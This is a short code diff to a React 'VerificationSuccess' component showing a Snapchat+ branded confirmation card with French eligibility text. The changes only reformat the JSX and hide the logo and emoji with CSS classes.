@@ -7,14 +7,14 @@ export default function VerificationSuccess({ data }) {
       initial={{ opacity: 0, y: 24 }}
       animate={{ opacity: 1, y: 0 }}
       transition={{ duration: 0.5, ease: "easeOut" }}
-      className="w-full max-w-sm mx-auto"
-    >
+      className="w-full max-w-sm mx-auto">
+      
       <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">
 
         {/* Logo */}
         <div className="flex flex-col items-center mb-6">
-          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30">
-            <span className="text-3xl">👻</span>
+          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30 hidden">
+            <span className="text-3xl hidden">👻</span>
           </div>
           <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
             Snapchat<span className="text-primary">+</span>
@@ -63,6 +63,6 @@ export default function VerificationSuccess({ data }) {
           L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         </p>
       </div>
-    </motion.div>
-  );
+    </motion.div>);
+
 }
